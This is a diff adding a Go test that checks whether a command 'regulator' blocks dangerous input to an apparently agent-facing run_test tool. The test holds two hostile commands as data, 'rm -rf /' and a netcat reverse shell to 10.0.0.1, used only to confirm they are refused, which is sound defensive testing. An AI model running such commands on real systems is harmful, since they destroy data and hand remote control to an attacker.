@@ -430,3 +430,30 @@ func TestExecBash_LineTruncationAndStderr(t *testing.T) {
 		t.Errorf("expected stderr diagnostic marker preserved when stdout is large, got: %s", outWithStderr)
 	}
 }
+
+func TestRunTest_RegulatorStaticRiskBlocked(t *testing.T) {
+	tool, ok := DefaultRegistry.Get("run_test")
+	if !ok {
+		t.Fatal("run_test not found in DefaultRegistry")
+	}
+
+	ctx := context.Background()
+
+	// 1. Dangerous destructive command blocked
+	_, err := tool.Execute(ctx, "rm -rf /")
+	if err == nil {
+		t.Fatal("expected dangerous run_test command 'rm -rf /' to be blocked by regulator, but succeeded")
+	}
+	if !strings.Contains(err.Error(), "regulator blocked execution") {
+		t.Errorf("expected regulator error message, got: %v", err)
+	}
+
+	// 2. Network socket reverse shell blocked
+	_, err = tool.Execute(ctx, "nc -e /bin/sh 10.0.0.1 4444")
+	if err == nil {
+		t.Fatal("expected netcat reverse shell in run_test to be blocked by regulator, but succeeded")
+	}
+	if !strings.Contains(err.Error(), "regulator blocked execution") {
+		t.Errorf("expected regulator error message, got: %v", err)
+	}
+}
